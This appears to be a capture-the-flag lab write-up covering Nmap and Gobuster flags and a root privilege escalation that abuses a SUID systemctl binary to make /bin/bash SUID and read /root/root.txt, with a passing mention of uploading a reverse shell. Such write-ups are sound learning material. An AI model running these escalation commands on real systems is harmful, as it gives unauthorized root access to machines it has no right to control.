### NMAP
Nmap is a free, open-source and powerful tool used to discover hosts and services on a computer network.

|               |                                                                                     |
| ------------- | ----------------------------------------------------------------------------------- |
| Nmap flag     | Description                                                                         |
| -sV           | Attempts to determine the version of the services running                           |
| -p <x> or -p- | Port scan for port <x> or scan all ports                                            |
| -Pn           | Disable host discovery and scan for open ports                                      |
| -A            | Enables OS and version detection, executes in-build scripts for further enumeration |
| -sC           | Scan with the default Nmap scripts                                                  |
| -v            | Verbose mode                                                                        |
| -sU           | UDP port scan                                                                       |
| -sS           | TCP SYN port scan                                                                   |


---
### Gobuster
Gobuster is a fast directory and file brute-forcing tool that helps discover hidden directories and files on a web server. It works by trying different paths from a given wordlist and checking if they exist on the target server.

### **Command Breakdown:**

```bash
gobuster dir -u http://10.10.102.44:3333 -w /path/to/wordlist
```

This command brute-forces directories on the target `http://10.10.102.44:3333` using a wordlist.

### **Flags Explanation:**

| Flag           | Description                                          |
| -------------- | ---------------------------------------------------- |
| `-e`           | Prints full URLs of discovered directories.          |
| `-u`           | Specifies the target URL.                            |
| `-w`           | Path to the wordlist used for brute-forcing.         |
| `-U` & `-P`    | Used for Basic Authentication (Username & Password). |
| `-p <proxy>`   | Uses a proxy for requests.                           |
| `-c <cookies>` | Simulates authentication by sending cookies.         |

After discovering a directory where file uploads are allowed, you can try uploading a reverse shell to gain access to the server. 



---
### **Privilege Escalation Using `systemctl` SUID Binary** 

We exploited a **misconfigured SUID binary** (`/bin/systemctl`) to **gain root access** and retrieve the flag.

---

## **1️⃣ Understanding the Exploit**

### **🔹 What is `systemctl`?**

`systemctl` is a **Linux service manager** used to start, stop, enable, or disable services. If it has the **SUID bit** (`rwsr-xr-x`), any user can run it with **root privileges**, making it **dangerous** if misconfigured.

### **🔹 Checking for SUID on `systemctl`**

We verified that `systemctl` had the **SUID bit** using:

```bash
ls -l /bin/systemctl
```

Output:

```
rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
```

- `rwsr-xr-x` → **SUID is set (`s`)**, meaning it runs as **root**, even when executed by a lower-privileged user.

---

## **2️⃣ Exploiting `systemctl` to Gain Root**

Since `systemctl` has **SUID**, we created a **malicious systemd service** that executes `/bin/bash` as root.

### **🔹 Step 1: Create a Malicious Systemd Service**

We wrote a service file (`root.service`) that **grants SUID to `/bin/bash`**:

```bash
echo '[Service]
Type=exec
ExecStart=/bin/bash -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/root.service
```

📌 **Explanation:**

- `ExecStart=/bin/bash -c "chmod +s /bin/bash"` → Gives **SUID root privileges** to `/bin/bash`.
- `WantedBy=multi-user.target` → Ensures the service **starts automatically** in multi-user mode.

### **🔹 Step 2: Load & Start the Malicious Service**

```bash
/bin/systemctl daemon-reload
/bin/systemctl restart root.service
```

- `daemon-reload` → Reloads systemd to recognize the new service.
- `restart root.service` → Runs our **malicious service**, making `/bin/bash` a SUID binary.

---

## **3️⃣ Spawning a Root Shell**

Now that `/bin/bash` has **SUID privileges**, we ran:

```bash
bash -p
```

📌 **Explanation:**

- `bash -p` → Runs bash **without dropping privileges**, so it executes as **root**.
- `whoami` confirmed we got **root access**.

---

## **4️⃣ Retrieving the Flag**

Once root, we searched for the flag:

```bash
ls -la /root
cat /root/root.txt
```

---
